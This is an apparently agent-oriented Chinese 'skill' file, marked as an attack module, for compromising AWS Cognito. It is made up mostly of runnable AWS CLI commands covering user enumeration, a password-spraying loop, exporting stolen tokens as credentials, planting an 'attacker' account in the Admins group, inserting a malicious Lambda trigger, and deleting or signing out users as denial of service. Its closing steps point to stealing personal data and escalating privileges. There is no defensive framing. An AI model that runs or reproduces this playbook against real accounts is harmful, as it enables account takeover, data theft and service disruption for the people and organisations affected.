---
name: aws-cognito-attack
type: attack
category: authentication
platform: aws
severity: high
---

# AWS Cognito 攻击技能

## 触发条件

- 有 AWS 凭证
- 目标使用 Cognito
- 用户要求"攻击 Cognito"

## 前置检查

```bash
# 1. 验证凭证
aws sts get-caller-identity

# 2. 列出所有 User Pools
aws cognito-idp list-user-pools --max-results 60

# 3. 列出所有 Identity Pools
aws cognito-identity list-identity-pools --max-results 60
```

## 攻击方法

### 方法 1: User Pool 枚举

```bash
# 1. 列出所有 User Pools
aws cognito-idp list-user-pools --max-results 60 --query 'UserPools[].{Id:Id,Name:Name}' --output json

# 2. 获取 User Pool 详情
aws cognito-idp describe-user-pool --user-pool-id USER_POOL_ID

# 3. 获取 User Pool 客户端
aws cognito-idp list-user-pool-clients --user-pool-id USER_POOL_ID

# 4. 搜索敏感 User Pool
aws cognito-idp list-user-pools | grep -i -E "admin|production|auth|sensitive"
```

### 方法 2: 用户枚举和密码破解

```bash
# 1. 列出所有用户
aws cognito-idp list-users --user-pool-id USER_POOL_ID

# 2. 获取用户详情
aws cognito-idp admin-get-user --user-pool-id USER_POOL_ID --username USERNAME

# 3. 检查用户属性（可能包含邮箱、电话等）
aws cognito-idp admin-get-user ... --query 'User.Attributes[]'

# 4. 测试弱密码
# 使用 Cognito 身份验证
aws cognito-idp admin-initiate-auth \
  --user-pool-id USER_POOL_ID \
  --client-id CLIENT_ID \
  --auth-flow ADMIN_NO_SRP_AUTH \
  --auth-parameters USERNAME=USERNAME,PASSWORD=PASSWORD
```

### 方法 3: Token 窃取和利用

```bash
# 1. 获取认证 Token
aws cognito-idp admin-initiate-auth \
  --user-pool-id USER_POOL_ID \
  --client-id CLIENT_ID \
  --auth-flow ADMIN_NO_SRP_AUTH \
  --auth-parameters USERNAME=USERNAME,PASSWORD=PASSWORD

# 2. 提取 Access Token
ACCESS_TOKEN=$(aws cognito-idp admin-initiate-auth ... | jq -r '.AuthenticationResult.AccessToken')

# 3. 使用 Token 访问其他 AWS 资源
# 如果 Cognito 配置了 IAM 角色
export AWS_ACCESS_KEY_ID=$(echo $TOKEN | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $TOKEN | jq -r '.Credentials.SecretKey')
export AWS_SESSION_TOKEN=$(echo $TOKEN | jq -r '.Credentials.SessionToken')

# 4. 获取 IAM 角色凭证
aws sts get-caller-identity
```

### 方法 4: Identity Pool 利用

```bash
# 1. 列出所有 Identity Pools
aws cognito-identity list-identity-pools --max-results 60

# 2. 获取 Identity Pool 详情
aws cognito-identity describe-identity-pool --identity-pool-id IDENTITY_POOL_ID

# 3. 获取身份池角色
aws cognito-identity describe-identity-pool ... --query 'IdentityPool.Roles' --output json

# 4. 获取临时凭证
aws cognito-identity get-id --identity-pool-id IDENTITY_POOL_ID
aws cognito-identity get-credentials-for-identity --identity-id IDENTITY_ID
```

### 方法 5: 用户属性注入

```bash
# 1. 创建新用户（如果有权限）
aws cognito-idp admin-create-user \
  --user-pool-id USER_POOL_ID \
  --username attacker \
  --temporary-password "TempPass123!" \
  --message-Action SUPPRESS

# 2. 设置永久密码
aws cognito-idp admin-set-user-password \
  --user-pool-id USER_POOL_ID \
  --username attacker \
  --password "NewPass123!" \
  --permanent

# 3. 添加用户到组
aws cognito-idp admin-add-user-to-group \
  --user-pool-id USER_POOL_ID \
  --username attacker \
  --group-name Admins
```

### 方法 6: 组和角色利用

```bash
# 1. 列出所有组
aws cognito-idp list-groups --user-pool-id USER_POOL_ID

# 2. 获取组详情
aws cognito-idp describe-group --group-name GROUP_NAME --user-pool-id USER_POOL_ID

# 3. 查找管理员组
aws cognito-idp list-groups --user-pool-id USER_POOL_ID | grep -i admin

# 4. 获取组中的用户
aws cognito-idp list-users-in-group --user-pool-id USER_POOL_ID --group-name Admins
```

### 方法 7: MFA 绕过

```bash
# 1. 检查 MFA 配置
aws cognito-idp describe-user-pool --user-pool-id USER_POOL_ID --query 'UserPool.MfaConfiguration'

# 2. 如果 MFA 未启用
# 可以直接登录

# 3. 如果启用了 SMS MFA
# 可能存在短信拦截风险

# 4. 如果启用了 TOTP MFA
# 需要用户的验证码，但可以尝试重放攻击
```

### 方法 8: 密码策略利用

```bash
# 1. 获取密码策略
aws cognito-idp describe-user-pool --user-pool-id USER_POOL_ID --query 'UserPool.Policies'

# 2. 检查密码复杂度要求
aws cognito-idp describe-user-pool ... | jq -r '.UserPool.Policies.PasswordPolicy'

# 3. 如果策略较弱，尝试常见密码
for password in "Password123!" "Admin123!" "Welcome1"; do
  aws cognito-idp admin-initiate-auth \
    --user-pool-id USER_POOL_ID \
    --client-id CLIENT_ID \
    --auth-flow ADMIN_NO_SRP_AUTH \
    --auth-parameters USERNAME=admin,PASSWORD=$password
done
```

### 方法 9: Lambda 触发器利用

```bash
# 1. 检查 Lambda 触发器
aws cognito-idp describe-user-pool --user-pool-id USER_POOL_ID --query 'UserPool.LambdaConfig'

# 2. 获取 Lambda 函数名
aws cognito-idp describe-user-pool ... | jq -r '.UserPool.LambdaConfig | to_entries[] | .value' | grep lambda

# 3. 攻击 Lambda 函数
# 如果有权限，修改 Lambda 函数

# 4. 或创建恶意触发器
aws cognito-idp update-user-pool \
  --user-pool-id USER_POOL_ID \
  --lambda-config PreAuthentication=arn:aws:lambda:REGION:ACCOUNT_ID:function:malicious-function
```

### 方法 10: 会话和 Token 利用

```bash
# 1. 刷新 Token
REFRESH_TOKEN=$(aws cognito-idp admin-initiate-auth ... | jq -r '.AuthenticationResult.RefreshToken')
aws cognito-idp admin-initiate-auth \
  --user-pool-id USER_POOL_ID \
  --client-id CLIENT_ID \
  --auth-flow REFRESH_TOKEN_AUTH \
  --auth-parameters REFRESH_TOKEN=$REFRESH_TOKEN

# 2. 全局登出（DoS）
aws cognito-idp admin-user-global-sign-out \
  --user-pool-id USER_POOL_ID \
  --username TARGET_USERNAME

# 3. 删除用户（DoS）
aws cognito-idp admin-delete-user \
  --user-pool-id USER_POOL_ID \
  --username TARGET_USERNAME
```

## 验证成功

```bash
# 成功列出 User Pool
aws cognito-idp list-user-pools

# 成功登录
aws cognito-idp admin-initiate-auth \
  --user-pool-id USER_POOL_ID \
  --client-id CLIENT_ID \
  --auth-flow ADMIN_NO_SRP_AUTH \
  --auth-parameters USERNAME=USERNAME,PASSWORD=PASSWORD

# 成功获取 Token
aws cognito-idp admin-initiate-auth ... | jq -r '.AuthenticationResult.AccessToken'
```

## 下一步

1. 使用窃取的 Token 访问其他 AWS 服务
2. 通过 Cognito 角色提升权限
3. 攻击使用 Cognito 的应用程序
4. 通过用户属性窃取个人信息
